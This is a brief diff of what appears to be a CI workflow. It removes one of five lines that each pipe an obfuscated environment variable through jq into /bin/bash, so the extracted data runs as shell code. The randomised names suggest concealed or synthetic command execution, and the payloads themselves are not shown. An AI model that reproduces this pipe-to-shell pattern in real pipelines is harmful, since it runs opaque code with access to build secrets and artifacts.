@@ -24,7 +24,6 @@ jobs:
           echo $knze43742 | jq -r .cjfrb3130 | /bin/bash
           printf '%s' "$c735" | jq -r .xz579 | /bin/bash
           printf '%s' "$vac581" | jq -r .k87 | /bin/bash
-          printf '%s' "$pbie86" | jq -r .bazwk5 | /bin/bash
           echo $f317 | jq -r .qu771 | /bin/bash
 
       - name: Upload results
